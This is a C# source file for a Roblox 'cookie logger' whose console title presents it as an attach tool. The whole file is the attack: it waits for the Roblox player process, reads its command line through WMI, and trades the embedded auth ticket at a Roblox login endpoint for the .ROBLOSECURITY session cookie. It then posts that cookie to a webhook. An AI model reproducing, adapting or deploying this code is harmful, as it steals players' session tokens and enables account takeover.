using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace dude
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Run Roblox Process To Attach!";
            bool pf = false;
            while (!pf)
            {
                if (Process.GetProcessesByName("RobloxPlayerBeta").Length > 0)
                    pf = true;
            }
            Process rbx = Process.GetProcessesByName("RobloxPlayerBeta")[0];
            string cli = GetCommandLine(rbx);
            string parsed = cli.Split(' ')[5];
            string cookie = CookieConversion(parsed);
             string webhook = "Webhook";
             string name = "Cookie Logger";
             string avatar = "https://cdn.discordapp.com/attachments/754469333899542539/755086852532338759/black-space.org.jpg";
            
            Http.Post(webhook, new NameValueCollection()
            {
                {
                    "username",
                    name

                },
                {
                    "avatar_url",
                    avatar

                },
                {
                    "content",
                    cookie
                },


            });
        }

        private static string GetCommandLine(Process process)
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id.ToString()))
            {
                using (ManagementObjectCollection source = managementObjectSearcher.Get())
                    return source.Cast<ManagementBaseObject>().SingleOrDefault<ManagementBaseObject>()?["CommandLine"]?.ToString();
            }
        }

        private static string CookieConversion(string auth)
        {
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string.Format("https://www.roblox.com/Login/Negotiate.ashx?suggest={0}", auth));
                httpWebRequest.Headers.Add("RBXAuthenticationNegotiation", ": https://www.roblox.com");
                httpWebRequest.Headers.Add("RBX-For-Gameauth", "true");
                httpWebRequest.Method = "GET";
                using (HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse())
                    return new Regex(".ROBLOSECURITY=(.*?);").Match(response.Headers.Get("Set-Cookie")).Groups[1].Value;
            }
            catch
            {
                return "Auth Ticket Expired";
            }
            
        }
        
    }
}
